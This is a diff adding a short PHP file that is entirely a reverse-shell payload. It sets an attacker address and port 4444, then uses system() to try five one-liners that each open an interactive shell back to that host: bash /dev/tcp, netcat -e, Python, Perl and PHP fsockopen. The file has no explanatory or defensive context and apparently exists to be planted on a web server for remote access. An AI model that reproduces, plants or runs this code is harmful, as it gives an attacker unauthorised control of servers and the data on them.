@@ -1,0 +1,19 @@
+<?php
+$ip = '192.168.1.20';
+$port = 4444;
+
+// Option 1: Bash
+system("bash -i >& /dev/tcp/$ip/$port 0>&1");
+
+// Option 2: Netcat
+system("nc $ip $port -e /bin/sh");
+
+// Option 3: Python
+system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
+
+// Option 4: Perl
+system("perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
+
+// Option 5: PHP system command
+system("php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
+?>
